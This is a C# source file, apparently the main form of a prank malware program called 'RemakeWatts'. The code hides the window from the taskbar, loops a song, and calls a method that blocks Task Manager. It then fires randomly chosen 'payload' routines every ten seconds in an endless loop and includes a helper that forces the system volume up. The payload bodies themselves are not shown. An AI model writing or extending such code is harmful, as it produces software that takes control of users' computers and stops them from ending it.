using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Media;
using System.Runtime.InteropServices;
using System.Net;

namespace RemakeWatts
{
    public partial class Form1 : Form
    {
        [DllImport("user32.dll")]
        public static extern IntPtr SendMessage(IntPtr hWnd, int Msg, IntPtr wParam, IntPtr lParam);

        public const int APP_COMMAND_VOLUME_UP = 0xA00;
        public const int WM_APP_COMMAND = 0x319;
        public Form1()
        {
            Random random = new Random();
            int x = random.Next(0, 1270);
            int y = random.Next(0, 920);
            
            this.StartPosition = FormStartPosition.Manual;
            this.Location = new Point(x, y);
            this.ShowInTaskbar = false;

            InitializeComponent();
            new Thread(() =>
            {
                SoundPlayer player = new SoundPlayer(Properties.Resources.Vicetone__Tony_Igy___Astronomia_2014);
                player.PlayLooping();
            }).Start();
            RandomPayload();
        }

        public void RandomPayload()
        {
            Payload payload = new Payload();
            payload.BlockTaskMngr(); 
            while(true)
            {
                Random random = new Random();
                
                int x = random.Next(1, 5);
                switch(x)
                {
                    case 1:
                        payload.payload1();
                        break;
                    case 2:
                        payload.payload2();
                        break;
                    case 3:
                        payload.payload3();
                        break;
                    case 4:
                        payload.payload4();
                        break;
                }
                Thread.Sleep(10000);
            }
        }

        private void VOL()
        {
            for (int i = 0; i < 20; i++) 
            {
                SendMessage(this.Handle, WM_APP_COMMAND, this.Handle, (IntPtr)APP_COMMAND_VOLUME_UP);
            }
        }
    }
}
